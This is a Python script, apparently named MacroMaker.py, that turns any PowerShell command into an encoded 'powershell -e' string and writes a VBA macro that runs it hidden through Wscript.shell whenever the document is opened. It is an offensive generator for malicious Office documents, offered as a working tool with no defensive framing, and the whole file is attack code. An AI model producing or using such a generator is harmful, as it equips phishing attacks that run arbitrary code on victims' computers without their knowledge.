#!/usr/bin/env python 

import base64
import argparse
import sys

class  Maker_Code:
       def __init__(self):
           self.control()
           self.MAKE_DO()
       def  MAKE_DO(self):
            if self.args.Command and self.args.Name and not self.args.read:
                   pass
            elif self.args.read and self.args.Name and not self.args.Command:
                   pass
            else:
                 print("\n[+] usage: MacroMaker.py [-h] -c C -n NAME")
                 print("[+] MacroMaker.py: error: the following arguments are required")
                 print("[+] use -C/--Command or -r/--read")
                 print("[+] use -h to see help options")
                 exit()
            if self.args.read :
               with open(self.args.read,'r') as file_Command :
                      read_file = file_Command.read()
                      payload = read_file
            else:                
                 payload = self.args.Command
            Command  = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
            Base64_Code    = "powershell -e "  + Command
            String_len = 50
            Do=""
            for i in range(0,len(Command),String_len):
                Commandloop = "Str= str+" + '"' + Command[i:i+String_len] +'"'+'\n'
                Do +='\t'+Commandloop
            with open (self.args.Name+".txt",'w') as Macro_File :
                        Micro_write = Macro_File.write("Sub "+self.args.Name+"()"+'\n'+"'\n'\n"\
                        +self.args.Name+"Macro"+"\n'\n'\n"+"End Sub"+'\n'+"Sub Document_Open()"\
                        +'\n'+"    "+self.args.Name+"Macro"+'\n'+"End Sub"+'\n'+"Sub "+self.args.Name+"Macro()\n"\
                        +"\tDim Str As String\n"+f'{Do}'+'\n'\
                        +'\tCreateObject("Wscript.shell").Run Str , 0, True \n'+"End Sub\n"
                       )
            with open (self.args.Name+".txt",'r') as Macro_File : 
                       Macro_read =  Macro_File.read()
            print(Macro_read)
       def control(self):    
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -n ] [arguments]")       
         parser.add_argument( "-c","--Command",help ="PowerShell Command ") 
         parser.add_argument( "-n","--Name"   ,help ="Name of the Macto")  
         parser.add_argument( "-r","--read"   ,help ="Name of the Macto")     
         self.args = parser.parse_args()        
         if len(sys.argv)!=1 :
            pass
         else:
            parser.print_help()         
            exit()
if __name__=='__main__':
   Maker_Code()
